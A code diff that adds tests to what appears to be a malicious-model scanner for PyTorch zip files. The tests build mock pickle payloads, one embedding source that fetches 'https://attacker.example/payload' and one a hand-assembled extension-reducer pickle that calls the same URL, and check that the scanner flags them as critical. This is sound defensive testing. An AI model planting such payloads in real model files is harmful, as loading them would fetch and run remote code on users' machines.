@@ -8020,6 +8020,12 @@ def _pickle_result_with_reduce(import_reference: str | None = None) -> ScanResul
     return result
 
 
+def _short_binunicode(data: bytes) -> bytes:
+    if len(data) > 0xFF:
+        raise ValueError("SHORT_BINUNICODE helper accepts at most 255 bytes")
+    return b"\x8c" + bytes([len(data)]) + data
+
+
 def _weights_only_analysis_check(result: ScanResult) -> Check:
     return next(check for check in result.checks if check.name == "CVE-2025-32434 Pickle Format Security Analysis")
 
@@ -8037,6 +8043,7 @@ def test_pytorch_zip_allows_inert_pickle_url_literals_without_critical_s310(tmp_
             "socket_docs": "https://docs.example.invalid/reference/socket.connect(host)",
             "credentialed_docs": "https://user:pass@docs.example.invalid/reference/requests.get(url)",
             "encoded_docs": "https://docs.example.invalid/%E2%98%83/%00/reference/subprocess.run(args)",
+            "apostrophe_docs": "https://docs.example.invalid/a'b/os.system(cmd)",
             "control_docs": "\x00https://docs.example.invalid/reference/httpx.get(url)\x1f",
             "repository": "https://github.com/ultralytics/ultralytics",
         },
@@ -8140,6 +8147,27 @@ def test_pytorch_zip_keeps_executable_network_pickle_literal_actionable(tmp_path
     )
 
 
+def test_pytorch_zip_keeps_imported_network_alias_url_actionable(tmp_path: Path) -> None:
+    model_path = create_mock_pytorch_zip(tmp_path / "network-alias-code.pt", with_pickle=False, prefix="archive")
+    payload = pickle.dumps(
+        {"loader": "from requests import get\nget('https://attacker.example/payload')"},
+        protocol=0,
+    )
+    with zipfile.ZipFile(model_path, "a") as zipf:
+        zipf.writestr("archive/data.pkl", payload)
+
+    result = PyTorchZipScanner().scan(str(model_path))
+
+    assert any(
+        issue.rule_code == "S310"
+        and issue.severity == IssueSeverity.CRITICAL
+        and issue.details.get("type") == "explicit_network_pattern"
+        and issue.details.get("pattern_type") == "url"
+        and issue.details.get("matched_text") == "https://attacker.example/payload"
+        for issue in result.issues
+    )
+
+
 def test_pytorch_zip_keeps_later_network_function_after_inert_url_actionable(tmp_path: Path) -> None:
     model_path = create_mock_pytorch_zip(tmp_path / "network-function-code.pt", with_pickle=False, prefix="archive")
     payload = pickle.dumps(
@@ -8217,6 +8245,30 @@ def test_pytorch_zip_keeps_network_url_reducer_actionable(tmp_path: Path) -> Non
         issue.severity == IssueSeverity.CRITICAL
         and issue.details.get("pickle_rule_code") == "DANGEROUS_CALL"
         and issue.details.get("associated_global") == "urllib.request.urlopen"
+        for issue in result.issues
+    )
+
+
+def test_pytorch_zip_keeps_extension_reducer_url_evidence_actionable(tmp_path: Path) -> None:
+    model_path = create_mock_pytorch_zip(tmp_path / "extension-url-reducer.pt", with_pickle=False, prefix="archive")
+    payload = b"\x80\x04\x82\x01" + _short_binunicode(b"https://attacker.example/payload") + b"\x85R."
+    with zipfile.ZipFile(model_path, "a") as zipf:
+        zipf.writestr("archive/data.pkl", payload)
+
+    result = PyTorchZipScanner().scan(str(model_path))
+
+    assert any(
+        issue.rule_code == "S201"
+        and issue.severity == IssueSeverity.CRITICAL
+        and issue.details.get("associated_global") == "__copyreg_extension__.code_1"
+        for issue in result.issues
+    )
+    assert any(
+        issue.rule_code == "S310"
+        and issue.severity == IssueSeverity.CRITICAL
+        and issue.details.get("type") == "explicit_network_pattern"
+        and issue.details.get("pattern_type") == "url"
+        and issue.details.get("matched_text") == "https://attacker.example/payload"
         for issue in result.issues
     )
 
